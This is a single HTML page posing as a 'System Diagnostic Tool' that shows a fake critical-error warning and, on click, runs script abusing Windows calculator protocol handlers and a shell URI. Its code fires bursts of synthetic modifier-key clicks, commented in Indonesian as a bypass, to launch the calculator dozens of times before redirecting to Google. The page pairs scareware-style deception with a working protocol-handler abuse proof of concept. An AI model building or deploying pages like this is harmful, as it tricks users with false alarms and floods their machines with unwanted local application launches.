<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic Tool</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ff00;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            text-align: center;
            border: 2px solid #00ff00;
            padding: 40px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
            background: rgba(0, 0, 0, 0.8);
        }

        h1 { font-size: 2.5rem; margin-bottom: 10px; }
        p { color: #888; margin-bottom: 30px; }

        #strike-btn {
            background: #00ff00;
            color: black;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s ease;
        }

        #strike-btn:hover {
            background: #008800;
            color: white;
            box-shadow: 0 0 30px #00ff00;
            transform: scale(1.05);
        }

        .status {
            margin-top: 20px;
            font-family: monospace;
            height: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>CRITICAL ERROR</h1>
    <p>Your system requires immediate calculator calibration.</p>
    <button id="strike-btn">FIX SYSTEM NOW</button>
    <div class="status" id="status-text"></div>
</div>

<script>
    const btn = document.getElementById('strike-btn');
    const status = document.getElementById('status-text');
    
    let strikes = 0;
    const maxStrikes = 50; // Dibatasi agar tidak crash total saat testing

    const launchCalc = () => {
        const protocols = [
            "calculator:",
            "ms-calculator:",
            "ms-calc:",
            "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"
        ];

        const execute = () => {
            if (strikes >= maxStrikes) {
                status.innerText = "REDIRECTING TO SAFETY...";
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
                return;
            }

            // Burst: 3 kalkulator per frame
            for(let i = 0; i < 3; i++) {
                const target = protocols[strikes % protocols.length];
                const a = document.createElement('a');
                a.href = target;
                
                // Modifier untuk bypass
                const evt = new MouseEvent('click', {
                    bubbles: true,
                    ctrlKey: true,
                    metaKey: true
                });
                
                a.dispatchEvent(evt);
            }

            strikes++;
            status.innerText = `INJECTING PROTOCOL: ${strikes * 2}%`;
            requestAnimationFrame(execute);
        };

        execute();
    };

    btn.onclick = (e) => {
        btn.style.display = 'none';
        launchCalc();
    };
</script>

</body>
</html>
